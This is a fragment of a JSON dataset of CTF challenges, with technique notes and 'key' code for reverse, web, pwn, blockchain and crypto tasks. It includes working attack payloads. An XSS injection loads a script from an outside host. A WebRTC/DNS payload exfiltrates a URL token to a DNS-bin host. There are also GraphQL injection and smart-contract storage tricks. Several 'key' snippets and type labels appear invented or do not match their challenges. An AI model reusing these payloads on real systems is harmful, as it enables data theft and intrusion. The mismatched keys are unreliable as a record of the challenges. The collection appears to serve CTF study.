            "In the scenario where a binary's output is based on its input and employs a deterministic mapping (potentially altered by an unknown key), a combination of brute force and dictionary attack can be applied. First, understand how input affects output (e.g., every two characters mapped to four numbers). Then, create a mapping dictionary by sending all possible inputs and recording their outputs. Lastly, if the output has been manipulated (e.g., via XOR with a key), deduce the key using known inputs and outputs, and apply the inverse operation to recover the original input values from an encrypted output.\n   - Example Python snippet to create and use a mapping dictionary:\n     ```python\n     dic = {}\n     for first in range(0x21, 0x7F):\n         for second in range(0x21, 0x7F):\n             # Send input and capture output logic here\n             dic[(output_a, output_b, output_c, output_d)] = (first, second)\n     # Use dic for reverse mapping to recover inputs\n     ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nvoid generate_numbers(const char *input) {\n    int numbers[4];\n    srand(time(NULL)); // Seed the random number generator with current time\n\n    for (int i = 0; i < 4; i++) {\n        numbers[i] = rand() % 16; // Generate a random number between 0 and 15\n    }\n\n    for (int i = 0; i < 4; i++) {\n        printf(\"%d \", numbers[i]);\n    }\n    printf(\"\\n\");\n}\n\nint main() {\n    char input[44];\n    FILE *file = fopen(\"flag.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"fopen\");\n        return 1;\n    }\n\n    if (fgets(input, sizeof(input), file) == NULL) {\n        perror(\"fgets\");\n        fclose(file);\n        return 1;\n    }\n    fclose(file);\n\n    generate_numbers(input);\n    return 0;\n}\n```"
    },
    {
        "name": "zoom_zoom_vision",
        "write_up": "dataset/raw/zoom_zoom_vision.md",
        "type": "reverse",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges involving C++ compiled executables, running the executable and observing its behavior, such as processing input or error messages, can provide clues about the binary's functionality even before applying reverse engineering tools. By executing the binary with different inputs and analyzing the output, patterns or encryption methods (like substitution in this case) can be deduced. Example initial inputs and outputs to observe:  \n   - Input: `123`  \n   - Output: `784 800 816`  \n   - Input: `aaa`  \n   - Output: `1552 1552 1552`",
            "When encountering encrypted or encoded output from a binary, constructing a decoding map by providing known inputs and recording outputs allows for the creation of a reverse lookup table. This method is useful when the encryption or encoding appears to be a simple substitution cipher. The process involves running the program with a full character set, parsing these outputs to build the map, and then applying this map to decode any provided encrypted sequences or to decode hidden messages within the binary.\n   - No direct example payload given due to the customized nature of the decoding map, but the approach involves systematic input testing (`a-z`, `0-9`, etc.) and mapping observed outputs to these inputs."
        ],
        "key": "```cpp\n#include <iostream>\n#include <string>\n\nint main() {\n    std::string input;\n    std::cout << \"Enter serial: \";\n    std::cin >> input;\n\n    for (char &c : input) {\n        int encrypted_value = (int)c * 8 + 1000; // Example of a simple substitution\n        std::cout << encrypted_value << \" \";\n    }\n    std::cout << \"\\nTry again, son!\" << std::endl;\n\n    return 0;\n}\n```"
    },
    {
        "name": "zshfuck",
        "write_up": "dataset/raw/zshfuck.md",
        "type": "misc",
        "competition": [
            "DiceCTF/2024/Quals",
            "https://ctftime.org/event/2217/tasks/"
        ],
        "score": 127,
        "max_score": 281,
        "difficulty": 0.45195729537366547,
        "knowledge": [
            "In scenarios where the input characters are severely limited, such as a zsh jail that allows only a specific set of characters and limits the length of input, utilizing wildcard characters effectively allows for operations that deeply navigate or perform actions beyond these limitations. For instance, the wildcard `[!x]` can act as a substitute for other characters that are not allowed, expanding the options for commands or paths that can be executed. This technique can be particularly useful in bypassing restrictions to execute files or traverse directories.\n   \n   Example payload to navigate directories: `./[!.][!.][!.]/[!.][!.][!.][!.]/[!.][!.][!.][!.][!.][!.][!.][!.][!.]/[!.][!.][!.][!.]/[!.][!.][!.][!.][!.][!.][!.]`",
            "The command `ls -R` can be leveraged in situations where manual navigation through file systems is constrained either by input limitations or knowledge of the file structure. Its recursive listing functionality provides a comprehensive outline of all files and directories underneath the current directory, which is valuable for uncovering paths or files of interest that might not be immediately visible or accessible due to the environment constraints (e.g., a restricted shell or a jail).\n\n   Example command to reveal directory structure: `ls -R`"
        ],
        "key": "```bash\n#!/bin/zsh  \nprint -n -P \"%F{green}Specify your charset: %f\"  \nread -r charset  \n# get uniq characters in charset  \ncharset=(\"${(us..)charset}\")  \nbanned=('*' '?' '`')\n\nif [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then  \n   print -P \"\\n%F{red}That's too easy. Sorry.%f\\n\"  \n   exit 1  \nfi  \nprint -P \"\\n%F{green}OK! Got $charset.%f\"  \ncharset+=($'\\n')\n\n# start jail via coproc  \ncoproc zsh -s  \nexec 3>&p 4<&p\n\n# read chars from fd 4 (jail stdout), print to stdout  \nwhile IFS= read -u4 -r -k1 char; do  \n   print -u1 -n -- \"$char\"  \ndone &  \n# read chars from stdin, send to jail stdin if valid  \nwhile IFS= read -u0 -r -k1 char; do  \n   if [[ ! ${#char:|charset} -eq 0 ]]; then  \n       print -P \"\\n%F{red}Nope.%f\\n\"  \n       exit 1  \n   fi  \n   # send to fd 3 (jail stdin)  \n   print -u3 -n -- \"$char\"  \ndone\n```"
    },
    {
        "name": "zzz",
        "write_up": "dataset/raw/zzz.md",
        "type": "The first part of the write-up describes a reverse challenge involving solving constraints using z3, while the second part involves solving z3 constraints as well. \n\nTherefore, the type of the challenge is **reverse**.",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving symbolic execution or constraint satisfaction, especially when analyzing binaries to find input values that lead to a specific program state (e.g., successful execution path), tools like angr can be leveraged to automate the process. To use angr effectively, one can define success and failure conditions by examining the program's output for specific success or failure messages, respectively. This approach allows for the automatic exploration of the program's state space to find inputs that satisfy all constraints leading to the desired state. Example angr script components include defining success and failure state checks (`is_successful`, `should_abort` functions), adding initial constraints for the known parts of the input, and using `explore` to find the solution.",
            "For challenges that require finding specific inputs satisfying complex mathematical or logical conditions, the Z3 Theorem Prover can be utilized to model and solve these conditions. By representing each unknown as a BitVec or an integer and adding constraints based on the challenge's requirements, Z3 can effectively find values that satisfy all given conditions. This method is particularly useful in reverse engineering challenges where the input conditions are non-trivial, involving arithmetic, bitwise operations, or specific character restrictions. A Z3 script typically involves creating a `Solver`, defining variables, adding constraints based on the challenge's logic, and asking the solver to find a model that satisfies all constraints. If a model is found, the solution can be extracted and decoded to retrieve the flag."
        ],
        "key": "```python\nfrom z3 import *\n\ns = Solver()\n\na = [BitVec(f'a{i}', 64) for i in range(35)]\n\nl = [ 0x76, 0x26, 0x2f, 0xfd, 0x91, 0xec, 0x37, 0xde, 0x66, 0x70, 0x1e, 0x8a,\n0x5a, 0x46, 0xa8, 0x63, 0xb7, 0xf0, 0xa3, 0x24, 0x61, 0xc1, 0x2b, 0xa0, 0xd6,\n0x50, 0x4f, 0x92, 0x9b, 0x52, 0xcb, 0xe8, 0xed, 0x4b, 0xf1, 0x4d, 0x01, 0x8e,\n0x9c, 0xca, 0x5f, 0x34, 0x64, 0x97, 0x23, 0xc7, 0xee, 0x18, 0x6a, 0x72, 0x3c,\n0xf6, 0x32, 0xd3, 0x6e, 0x08, 0x3b, 0xb3, 0xb8, 0xab, 0xf4, 0x29, 0xc2, 0x67,\n0x1f, 0xe2, 0x59, 0xad, 0xe5, 0x81, 0xbe, 0x7b, 0x9f, 0xa1, 0x10, 0x90, 0xfc,\n0xb2, 0xff, 0x41, 0x33, 0xa2, 0x42, 0xcc, 0x69, 0x62, 0x68, 0x22, 0xb9, 0x96,\n0x71, 0xe6, 0x21, 0x40, 0x3f, 0xdc, 0x93, 0xbb, 0x44, 0x7c, 0xd4, 0xcf, 0xe3,\n0xf7, 0x78, 0x31, 0x85, 0x79, 0x95, 0x27, 0xda, 0xf5, 0x4e, 0x7f, 0x20, 0xa6,\n0xe0, 0xe1, 0x7e, 0x3d, 0xd5, 0xaf, 0x8d, 0xfa, 0xb1, 0xe9, 0xaa, 0x1b, 0x49,\n0x58, 0xe7, 0x0d, 0x47, 0xbc, 0xe4, 0x04, 0x17, 0xb0, 0xc8, 0x4a, 0x02, 0x99,\n0x6d, 0xdf, 0xdd, 0x65, 0x09, 0x7d, 0x6f, 0x0b, 0xc4, 0x19, 0x1d, 0xfe, 0xd7,\n0x5b, 0x06, 0xa4, 0xf3, 0xa9, 0x2d, 0xc0, 0x9a, 0x53, 0x89, 0x16, 0xa5, 0xbd,\n0x74, 0x2a, 0x05, 0xc5, 0x6b, 0xd9, 0xf8, 0xfb, 0x39, 0x2c, 0x5d, 0xd0, 0x3e,\n0xbf, 0x03, 0x7a, 0x94, 0xc9, 0x1c, 0x25, 0x5e, 0x11, 0xf2, 0x8f, 0x5c, 0x14,\n0xeb, 0x45, 0x9d, 0x38, 0x86, 0x98, 0x1a, 0xb4, 0x28, 0x51, 0x0c, 0x13, 0xac,\n0x0a, 0x35, 0x82, 0xb6, 0x8b, 0x30, 0x75, 0xd8, 0x00, 0xef, 0xba, 0xc3, 0xae,\n0xf9, 0x9e, 0x4c, 0x0e, 0x77, 0x57, 0xd1, 0x6c, 0xdb, 0x3a, 0x07, 0xcd, 0x54,\n0x8c, 0x15, 0x88, 0x2e, 0xd2, 0xa7, 0xea, 0x55, 0xc6, 0xce, 0xb5, 0x43, 0x0f,\n0x56, 0x60, 0x83, 0x80, 0x84, 0x36, 0x87, 0x12, 0x48, 0x73 ]\n\nfor i in range(35):  \n   s.add(Or(a[i] == ord('-'), And(a[i] >= ord('A'), a[i] <= ord('Z')),\nAnd(a[i] >= ord('a'), a[i] <= ord('z')), And(a[i] >= ord('0'), a[i] <=\nord('9'))))\n\ns.add(a[26] + a[24] + a[15] + a[13] + a[4] + a[2] + a[0] + a[28] == 486)  \ns.add(a[1] * a[0] - a[4] + a[12] * a[13] - a[16] + a[24] * a[25] - a[28] ==\n13713)  \ns.add(a[27] * a[14] * a[3] - a[15] * a[2] * a[25] == -6256)  \ns.add((a[1] - a[3]) * a[4] == 48)  \ns.add((8 * a[13] - 4 * a[15]) * a[14] == 20604)  \ns.add((4 * a[28] - 4 * a[0]) * a[27] == -5616)\n\nfor i in range(35):  \n   v5 = If(And(i%12 <= 4, (Or(Or(ord('Z') < a[i], a[i] < ord('0')),\nAnd(ord('9') < a[i], a[i] < ord('A'))))), 0, 1)\n\nv1 = If(And(a[4] - a[3] - a[2] - a[1] + a[0] * a[0] == 6744, a[16] - a[15] -\na[14] - a[13] + a[12] * a[12] == 2405, a[28] - a[27] - a[26] - a[25] + a[24] *\na[24] == 4107), 1, 0)  \nv2 = If(And(a[14] <= 57, (a[14] + a[24]) * (a[28] - a[1]) == -1508), 1, 0)\n\ns.add(v1 == 1)  \ns.add(v2 == 1)  \ns.add(v5 == 1)\n\nfor i in range(35):  \n   if i not in [5, 11, 17, 23, 29]:  \n       s.add(a[i] != ord('-'))\n\ns.add(a[5] == ord('-'))  \ns.add(a[11] == ord('-'))  \ns.add(a[17] == ord('-'))  \ns.add(a[23] == ord('-'))  \ns.add(a[29] == ord('-'))\n\nll = [0] * 15\n\nxx = [ 6, 7, 8, 9, 10, 18, 19, 20, 21, 22, 30, 31, 32, 33, 34 ]\n\nvv5 = 0  \nvv6 = 0  \nfor i in range(15):  \n   vv5 = (vv5 + 1) % 256  \n   vv6 = (vv6 + (l[vv5] & 0xff)) % 256  \n   v4 = l[vv5] & 0xff  \n   l[vv5] = l[vv6] & 0xff  \n   l[vv6] = v4  \n   a[xx[i]] ^= (l[((l[vv5] & 0xff) + (l[vv6] & 0xff)) & 0xff] & 0xff)\n\nvv8 = 0  \na2 = 15  \ngg = []\n\nwhile vv8 < a2:  \n   vv7 = 0  \n   vv3 = 0  \n   vv12 = [0] * 4  \n   while True:  \n       if vv7 <= 2 and vv8 < a2:  \n           vv3 = (vv3 << 8) | (a[xx[vv8]] & 0xff)  \n           vv8 += 1  \n           vv7 += 1  \n       else:  \n           break  \n   vv4 = vv3 << (8 * (3 - vv7))  \n   for i in range(4):  \n       if vv7 >= i:  \n           vv12[i] = (vv3 >> (6 * (3 - i))) & 0x3F  \n       else:  \n           vv12[i] = 64  \n       gg.append(vv12[i])\n\nppp = [39, 17, 24, 4, 25, 35, 3, 46, 42, 49, 45, 37, 11, 60, 11, 58, 4, 26,\n45, 2]\n\nfor i in range(20):  \n   s.add(gg[i] == ppp[i])\n\nprint(s.check())\n\nm = s.model()\n\nflag = {}\n\nfor d in m.decls():  \n   flag[int(d.name()[1:])] = m[d].as_long()\n\nw = ''\n\nfor i in sorted(flag):  \n   w += chr(flag[i])\n\nprint(w)\n```"
    },
    {
        "name": "[Blockchain] Re-Remix",
        "write_up": "dataset/raw/[Blockchain] Re-Remix.md",
        "type": "web",
        "competition": [
            "SekaiCTF/2022",
            "https://ctftime.org/event/1923/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "In Ethereum smart contracts, particularly in scenarios involving updating contract storage directly via assembly code, it's possible to exploit the contract by directly manipulating storage slots if the location and structure of storage variables are known. This technique can be used to bypass normal function and modifier-based restrictions. This method requires calculating the correct storage slot to manipulate and can be applied universally in contracts where direct storage access isn't properly guarded against. \n   - Example payload: `sampleEditor.updateSettings(0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4, type(uint256).max);`",
            "Liquidity pool manipulation in DeFi platforms, specifically using techniques like flash loans or optimized swaps, can be employed to artificially inflate or deflate token values or pool reserves temporarily. This principle is applicable in scenarios where the contract logic depends on external oracles or the manipulated value from the pool to make decisions, such as calculating rewards, minting new tokens, or in this case, achieving a higher game level. Understanding the underlying mechanics of AMM (Automated Market Makers) and their functions allows for strategic insertion and removal of liquidity to achieve desired outcomes.\n   - Example command sequence: \n     1. `equalizer.equalize{value: 0.11 ether}(0, 1, 0.11 ether);`\n     2. `equalizer.equalize{value: 0.11 ether}(0, 2, 0.11 ether);`\n     3. `uint256[3] memory amounts = [uint(0.1 ether), uint(0.1 ether), uint(0.1 ether)];`\n     4. `inst.approve(address(equalizer), amounts[1]);`\n     5. `vocal.approve(address(equalizer), amounts[2]);`\n     6. `uint256 lpAmount = equalizer.increaseVolume{value: 0.1 ether}(amounts);`\n     7. `equalizer.decreaseVolume(lpAmount);`"
        ],
        "key": "```solidity  \nfunction _getComplexity(uint256 n) internal pure returns (uint256 c) {  \n    bytes memory s = bytes(Strings.toString(n));  \n    bool[] memory v = new bool[](10);  \n    for (uint i; i < s.length; ++i) {  \n        v[uint8(s[i]) - 48] = true;  \n    }  \n    for (uint i; i < 10; ++i) {  \n        if (v[i]) ++c;  \n    }  \n}\n```"
    },
    {
        "name": "[insert creative algo chall name]",
        "write_up": "dataset/raw/[insert creative algo chall name].md",
        "type": "misc",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 449,
        "max_score": 500,
        "difficulty": 0.898,
        "knowledge": [
            "When faced with a challenge requiring the enumeration of unique combinations or partitions of a set where operations on subsets are involved (e.g., summing elements within subsets), leveraging a high-level programming library such as `more_itertools` can significantly simplify the process. Utilizing `set_partitions` function from the `more_itertools` library can aid in dividing a set into a specific number of subsets efficiently. This approach is valuable when handling combinatorial problems in pythonic CTF challenges.\n   \n   Example of leveraging `more_itertools` for partitioning and summing subsets:\n   ```python\n   import more_itertools\n   \n   x = 4  # Number of desired subsets\n   n = 12 # The upper range for generating a set of exponential values\n   \n   r = [2**i for i in range(n)] # Generating a set of values\n   \n   parts = more_itertools.set_partitions(r, k=x) # Partitioning the set into x subsets\n   \n   summed_subsets = [set(sum(i) for i in p) for p in parts] # Summing elements within each subset\n   \n   print(len(summed_subsets)) # Printing the number of unique summed combinations\n   ```",
            "For challenges that involve generating sets with values increasing exponentially, a comprehension list generating exponential values using a simple for loop or through list comprehension can effectively establish the dataset required for the challenge. This method is a straightforward way to prepare data for further combinatorial operations or analyses.\n\n   Example of generating an exponentially increasing set:\n   ```python\n   n = 12 # Setting the upper limit for the exponential increase\n   \n   r = [2**i for i in range(n)] # Generating the set with exponential values\n   ```"
        ],
        "key": "```python\ndef vulnerable_function(input_data):\n    # Simulating a potential vulnerability with unchecked input\n    buffer = [0] * 10\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking, potential overflow\n    return buffer\n```"
    },
    {
        "name": "[web] wtftime",
        "write_up": "dataset/raw/[web] wtftime.md",
        "type": "pwn",
        "competition": [
            "Tasteless/2021",
            "https://ctftime.org/event/1326/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting GraphQL injections in scenarios where the input parameter such as \"id\" isn't properly sanitized, it is possible to manipulate the query to extract or alter data. By modifying the GraphQL query, an attacker can abuse the alias functionality to retrieve different fields than intended. For example, requesting the \"name\" field instead of the \"description\" can be achieved by crafting a query where aliases are used to swap the expected data fields. \n   - Example payload: `/?#wtf/2){id,challs{description:name}}a:wtf(id:2`",
            "In Cross-Site Scripting (XSS) attacks where direct script insertion might be sanitized, embedding the payload in less straightforward HTML tags, such as `<iframe>` with a `srcdoc` attribute containing the malicious script, can bypass sanitization checks. This approach leverages browsers executing JavaScript within the `srcdoc` attribute, thus achieving the XSS without directly injecting `<script>` tags into the vulnerable application.\n   - Example payload for injecting XSS via GraphQL mutation: `mutation createChall{ createChall(input: {wtf:2, name:\"<iframe srcdoc=\\\"<script src='https://bi.tk/zob/xss.js'></script>\\\"></iframe>\", description:\"xss\"}){id} }`"
        ],
        "key": "```javascript\nasync function ctf(id) {  \n   return await query(`{  \n       wtf(id: ${id}) { # Injection in id here  \n           name  \n           description  \n           challs {  \n               name  \n               points  \n               description  \n           }  \n       }  \n   }`)  \n}\n```"
    },
    {
        "name": "_q!!!!!!!",
        "write_up": "dataset/raw/_q!!!!!!!.md",
        "type": "pwn",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In CTF challenges that involve exploitation of memory corruption vulnerabilities, especially in custom or patched virtual machines or interpreters (like the vim9script virtual machine in the vim editor), one effective method to achieve arbitrary read and write capabilities is by utilizing unintended behavior caused by missing reference count increments (or other similar bugs). Specifically, when an object's reference count handling is compromised, attackers can manipulate object lifetimes to trigger use-after-free (UAF) conditions. These UAF conditions can be stabilized and exploited to overwrite function pointers or data structures, leading to arbitrary code execution or leaking sensitive information. Under such conditions, the exploitation process often involves creating controlled heap layouts through object allocations, leveraging objects like blobs that are suitable for arbitrary data storage and manipulation, and carefully crafting payloads to overwrite memory locations or manipulate heap metadata to achieve the exploit goals.\n\nExample payload step to trigger UAF:\n```vim\ndef Pwn()\n    var obj: CustomClass = CustomClass.new()\n    ManipulateRef(obj)  # Trigger the vulnerable reference handling\n    # Further exploitation steps follow...\nenddef\n```",
            "When exploiting binary applications or interpreters with restrictions such as restricted mode (disallowing shell commands) and write prevention to the filesystem, a strategic approach is to first focus on bypassing these restrictions before executing arbitrary commands to disclose secrets like flags. This often involves understanding the application's memory layout and altering specific bits or memory addresses responsible for enforcing these restrictions. For instance, if the target binary has a 'restricted' mode flag or similar security mechanisms stored in its memory, an attacker can aim to achieve arbitrary read/write capabilities to modify these mechanisms directly in memory. Techniques to do this typically include leaking addresses of known libraries or the executable itself to calculate offsets to critical memory structures and then using arbitrary write primitives to alter them.\n\nExample steps to alter the 'restricted' mode flag:\n```vim\n# Assuming arbitrary write capability is achieved\nSetBlobDataPtr(blob_replace, restricted_address)\nblob_o.b[0] = 0  # Nullifying the 'restricted' mode flag, or similar memory patching actions\n# Now the application restrictions can be bypassed\n```"
        ],
        "key": "```c\nstruct object_T {  \n\tclass_T *obj_class;  \n\tint obj_refcount;  \n\tobject_T *obj_next_used;  \n\tobject_T *obj_prev_used;  \n\tint obj_copyID;  \n\ttypval_T fields[];  \n};  \n```"
    },
    {
        "name": "_[a-z()",
        "write_up": "dataset/raw/_[a-z().]_.md",
        "type": "reverse",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In challenges restricting input characters and evaluating code within sandboxed environments like Node.js's `vm` module, utilizing inherent JavaScript properties and methods that do not require explicitly forbidden characters can bypass input restrictions. Specifically, using properties like `length`, `constructor`, and methods like `concat`, and exploring JavaScript's type coercion abilities can creatively construct and manipulate strings and numbers to achieve required outcomes. JavaScript's flexibility with types (e.g., auto-conversion between strings and numbers, using booleans as numbers) can be particularly useful.\n   \n   Example payload snippet: `((typeof(x)).length).constructor(true)` to generate the number `1` from a boolean `true`, and then `((typeof(x)).length).constructor((typeof(x)).big.name.length)` to generate the number `3` from the length of the function name `.big`.",
            "In scenarios where code length is severely limited, optimization techniques like leveraging JavaScript's type coercion and implicit conversions, or using less verbose methods accessible within the given constraints, help fit the payload within the character limit. Evaluating alternate methods with shorter syntax or exploiting language quirks (e.g., the automatic stringification of numbers when concatenated with strings) can reduce the overall length of the payload.\n\n   Example optimization: Reducing the payload size by omitting unnecessary type conversions for each digit after the first, and instead directly concatenating values to strings. This approach helps in fitting complex logic under strict size constraints."
        ],
        "key": "```javascript\n12 app.get('/', function (req, res, next) {  \n13   let output = '';  \n14   const code = req.query.code + '';  \n15   if (code && code.length < 200 && !/[^a-z().]/.test(code)) {  \n16     try {  \n17       const result = vm.runInNewContext(code, {}, { timeout: 500 });  \n18       if (result === 1337) {  \n19         output = process.env.FLAG;  \n20       } else {  \n21         output = 'nope';  \n22       }  \n23     } catch (e) {  \n24       output = 'nope';  \n25     }  \n26   } else {  \n27     output = 'nope';  \n28   }  \n29   res.render('index', { title: '[a-z().]', output });  \n30 });  \n```"
    },
    {
        "name": "\u14a3\u2351\u254e\u03df \u254e\u03df \u30ea\u14b7\u158b\u14a3",
        "write_up": "dataset/raw/\u14a3\u2351\u254e\u03df \u254e\u03df \u30ea\u14b7\u158b\u14a3.md",
        "type": "crypto",
        "competition": [
            "SpaceHeroes/2024",
            "https://ctftime.org/event/2254/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When decrypting AES encrypted messages, the necessary elements include the key, initialization vector (IV), and the ciphertext itself. For CBC mode, the first 16 bytes of the ciphertext can be used as the IV if it is not explicitly provided. A decryption script requires extracting these components correctly: the key from the encryption script, the IV as the first 16 bytes of the ciphertext, and the rest of the data as the ciphertext to be decrypted.\n   - Example decryption script snippet:\n     ```py\n     from Crypto.Cipher import AES\n     import binascii\n\n     key = b\"your_key_here\"\n\n     with open('your_encrypted_file.enc', 'rb') as file:  \n        hex_data = file.read()\n\n     cipher_text_bytes = binascii.unhexlify(hex_data)\n     iv = cipher_text_bytes[:16]  \n     cipher_text = cipher_text_bytes[16:]\n\n     cipher = AES.new(key, AES.MODE_CBC, iv)\n     plain_text = cipher.decrypt(cipher_text)\n\n     print(plain_text.decode('utf-8'))\n     ```",
            "In challenges involving encrypted messages, knowing the message's structure or a specific pattern at the beginning can significantly aid in confirming successful decryption. If all messages start with a known phrase (e.g., \"Mortimer_McMire:\"), this can be used as a validation tool to ensure that the decryption process has been conducted correctly without necessarily understanding the entire message content.\n   - Example practical use:\n     When decrypting, after obtaining the plaintext output, verify it begins with the known prefix to confirm successful decryption, which can be particularly helpful in scenarios with multiple possible keys or when uncertain of the AES mode specifics if not explicitly provided."
        ],
        "key": "```python  \nfrom Crypto.Cipher import AES  \nimport binascii, os\n\nkey = b\"3153153153153153\"  \niv =  os.urandom(16)\n\nplaintext = open('message.txt', 'rb').read().strip()\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\nencrypted_flag = open('message.enc', 'wb')  \nencrypted_flag.write(binascii.hexlify(cipher.encrypt(plaintext)))  \nencrypted_flag.close()  \n```"
    },
    {
        "name": "\u1d2cnother \u1d64seless \u1d2cpplication",
        "write_up": "dataset/raw/\u1d2cnother \u1d64seless \u1d2cpplication.md",
        "type": "web",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "When dealing with a sandboxed iframe with a restricted Content-Security-Policy (CSP) that prevents direct data exfiltration, consider leveraging `baseURI` property exploitation techniques. This is particularly effective in environments where the iframe's restrictions do not explicitly seal off this property. By exploiting `baseURI`, which includes the full URL (including the fragment), attackers can circumvent sandbox constraints to disclose sensitive information through crafted payloads. This approach is conditionally applicable in scenarios where the iframe source document inherits a parent's URL structure, potentially leaking tokens or other sensitive data embedded in the URL fragment.\n\n   Example payload: \n   ```html\n   <svg onload=\"console.log(baseURI)\">  \n   ```",
            "For scenarios where conventional data exfiltration methods are blocked by CSP rules, consider DNS exfiltration via WebRTC. This method works around CSP by abusing legitimate web protocols for covert data transmission. The exploitation leverages RTCPeerConnection to establish a WebRTC channel, then encodes and transmits sensitive information through DNS requests. This can be particularly effective in scenarios where direct web requests to attacker-controlled servers are prevented by CSP, but where the policy does not restrict WebRTC or DNS traffic.\n\n   Example payload:\n   ```js\n   (async()=>{\n     p=new RTCPeerConnection({iceServers:[{urls:'stun:LEAK.dnsbin'}]}); \n     p.createDataChannel('');\n     p.setLocalDescription(await p.createOffer())\n   })()\n   ```"
        ],
        "key": "```js  \nhost.startsWith(`${CHALL_URL}/cb`)  \n```\n\n```html  \n<svg onload=\"console.log(baseURI)\">  \n```\n\n```js  \n(async()=>{p=new RTCPeerConnection({iceServers:[{urls:\n\"stun:LEAK.dnsbin\"}]});p.createDataChannel('');p.setLocalDescription(await\np.createOffer())})()  \n```\n\n```html  \n<script>  \nfunction asciitoHex(ascii){  \nres = ''  \nfor (var n = 0; n < ascii.length; n ++) {  \n res += Number(ascii.charCodeAt(n)).toString(16);\n\n}return res;}  \n</script>  \n<svg onload=\"(async()=>{p=new RTCPeerConnection({iceServers:[{urls:\n'stun:'+asciitoHex(baseURI.split('#')[1])+'.your.dns.bin.test'}]});p.createDataChannel('');p.setLocalDescription(await\np.createOffer())})()\">  \n```\n\n```html  \n<script>  \n // login the admin in the app  \n w = window.open('http://site.aua.challs.teamitaly.eu/login')\n\n explurl =\n'http://sso.aua.challs.teamitaly.eu/login?callback=http://site.aua.challs.teamitaly.eu/cb/../profile?user=aaaaa'  \n  \n setTimeout(()=>{location = explurl}, 1000)  \n</script>  \n```"
    }
]